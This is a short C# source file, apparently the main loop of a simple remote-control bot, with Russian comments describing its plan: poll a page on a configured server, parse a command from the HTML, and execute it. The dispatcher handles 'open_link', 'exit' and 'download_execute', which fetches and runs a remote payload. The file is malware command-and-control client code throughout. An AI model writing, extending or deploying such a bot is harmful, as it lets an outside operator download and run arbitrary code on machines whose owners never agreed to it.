using ConsoleApp1;
using Microsoft.Win32;
using System;
using System.Text.RegularExpressions;
using System.Threading;

namespace test
{
    class Program
    {
        static void Main(string[] args)
        {
            //Загрузить страницу 
            //Спарсить команду 
            //Обработать и выполнить ее
            //Сделать постоянную проверку в цикле
            string last_cmd = string.Empty;
            while (true)
            {
                string html = Web.GetHTML(Config.server);
                Match regx = Regex.Match(html, "<p>(.*)</p></article>");
                string content = regx.Groups[1].Value;
                if (last_cmd == content)
                {
                    Thread.Sleep(Config.delay);
                    continue;
                }
                last_cmd = content;
                Cmd command = new Cmd(content);
                Execute(command);

                Thread.Sleep(Config.delay);
            }
        }
        static void Execute(Cmd cmd)
        {
            switch (cmd.ComType)
            {
                case "open_link":
                    Functions.OpenLink(cmd.ComContent);
                    break;

                case "download_execute":
                    Functions.DownloadExecute(cmd.ComContent);
                    break;

                case "exit":
                    Environment.Exit(0);
                    break;
            }
        }
    }
}
